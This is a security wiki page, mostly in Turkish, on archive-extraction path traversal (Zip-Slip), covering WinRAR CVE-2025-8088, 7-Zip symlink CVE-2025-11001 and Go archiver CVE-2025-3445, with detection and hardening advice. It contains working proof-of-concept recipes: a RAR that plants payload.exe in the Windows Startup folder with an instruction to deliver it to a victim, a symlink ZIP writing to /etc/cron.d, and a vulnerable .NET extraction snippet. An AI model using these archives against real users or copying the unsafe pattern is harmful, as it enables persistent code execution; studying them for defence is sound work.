# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her girişin kendi **iç yolunu** taşımasına izin verir. Bir extraction utility bu yolu körü körüne kabul ettiğinde, içinde `..` bulunan veya bir **mutlak yol** (ör. `C:\Windows\System32\`) içeren kötü amaçlı bir dosya adı, kullanıcının seçtiği dizinin dışına yazılır.
Bu zafiyet sınıfı genellikle *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.

Sonuçlar rasgele dosyaların üzerine yazılmasından, bir payload'u Windows *Startup* klasörü gibi bir **auto-run** konumuna bırakarak doğrudan **remote code execution (RCE)** elde etmeye kadar uzanabilir.

## Temel Sebep

1. Saldırgan, bir veya daha fazla dosya başlığının şunları içerdiği bir arşiv oluşturur:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Veya hedef dizinin dışına çözülen yaratılmış **symlinks** (ZIP/TAR'da *nix* üzerinde yaygındır).
2. Kurban, gömülü yola (veya symlinks'i takip eden) güvenen, yolu temizlemeyen veya çıkarılmayı seçilen dizin altına zorlamayan zafiyetli bir araçla arşivi çıkarır.
3. Dosya saldırganın kontrolündeki konuma yazılır ve sistem veya kullanıcı o yolu tetiklediğinde bir sonraki çalıştırmada/yüklemede yürütülür/yüklenir.

### .NET `Path.Combine` + `ZipArchive` traversal

Yaygın bir .NET anti-pattern, hedeflenen hedefi **kullanıcı kontrollü** `ZipArchiveEntry.FullName` ile birleştirmek ve yol normalizasyonu yapmadan çıkarmaktır:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Eğer `entry.FullName` `..\\` ile başlıyorsa path traversal gerçekleşir; eğer bir **absolute path** ise sol bileşen tamamen atılır ve bu, extraction sırasında **arbitrary file write** ile sonuçlanır.
- Proof-of-concept arşivi, zamanlanmış bir tarayıcı tarafından izlenen kardeş `app` dizinine yazmak için:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Bu ZIP'i izlenen gelen kutusuna bırakmak `C:\samples\app\0xdf.txt` ile sonuçlanır; bu, `C:\samples\queue\` dışına traversal olduğunu kanıtlar ve takip eden primitives'leri (ör. DLL hijacks) mümkün kılar.

## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR (içinde `rar` / `unrar` CLI, the DLL ve taşınabilir kaynak kodu bulunan sürümler dahil) çıkarma sırasında dosya adlarını doğrulamadı.
Şu gibi bir girdi içeren kötü amaçlı bir RAR arşivi:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde sonuçlanır. Oturum açıldıktan sonra Windows orada bulunan her şeyi otomatik olarak çalıştırır, bu da *kalıcı* RCE sağlar.

### PoC Arşivi Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Kullanılan seçenekler:
* `-ep`  – dosya yollarını verildiği gibi sakla (`./` başındaki öğeyi **kaldırma`).

evil.rar dosyasını hedefe teslim edin ve arşivi zafiyetli bir WinRAR sürümüyle açmaları için yönlendirin.

### Observed Exploitation in the Wild

ESET, RAR arşivlerini CVE-2025-8088'i kötüye kullanarak iliştiren ve özelleştirilmiş backdoors dağıtıp fidye yazılımı operasyonlarını kolaylaştıran RomCom (Storm-0978/UNC2596) spear-phishing kampanyalarını rapor etti.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Etkilenen**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Etkisi**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Hızlı PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Yama uygulanmış bir sürümde `/etc/cron.d` etkilenmez; sembolik link /tmp/target içinde bir link olarak çıkarılır.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Hata**: `archiver.Unarchive()` `../` ve symlink edilmiş ZIP girdilerini takip ederek `outputDir` dışına yazıyor.
* **Etkilenen**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık kullanımdan kaldırıldı).
* **Düzeltme**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal yeniden üretme**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Statik inceleme** – Arşiv girdilerini listeleyin ve adı `../`, `..\\`, *mutlak yollar* (`/`, `C:`) içeren veya hedefi çıkarma dizininin dışında olan *sembolik link* türündeki girdileri işaretleyin.
* **Kanonikleştirme** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
* **Sandbox extraction** – Bir *güvenli* ayıklayıcı (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) kullanarak geçici bir dizine açın ve ortaya çıkan yolların dizin içinde kaldığını doğrulayın.
* **Uç nokta izleme** – Bir arşiv WinRAR/7-Zip/etc. ile açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yazılan yeni yürütülebilir dosyalar için uyarı verin.

## Mitigation & Hardening

1. **Ayıklayıcıyı güncelleyin** – WinRAR 7.13+ ve 7-Zip 25.00+ yol/sembolik link sanitizasyonu uygulamaları içerir. Her iki araçta da otomatik güncelleme hâlâ yok.
2. Arşivleri mümkünse “**Do not extract paths**” / “**Ignore paths**” seçenekleriyle çıkarın.
3. Unix'te ayrıcalıkları düşürün ve çıkarma öncesi bir **chroot/namespace** monte edin; Windows'ta **AppContainer** veya bir sandbox kullanın.
4. Eğer özel kod yazıyorsanız, oluşturma/yazma işleminden **önce** `realpath()`/`PathCanonicalize()` ile normalleştirin ve hedef dizinden çıkan herhangi bir girdiyi reddedin.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
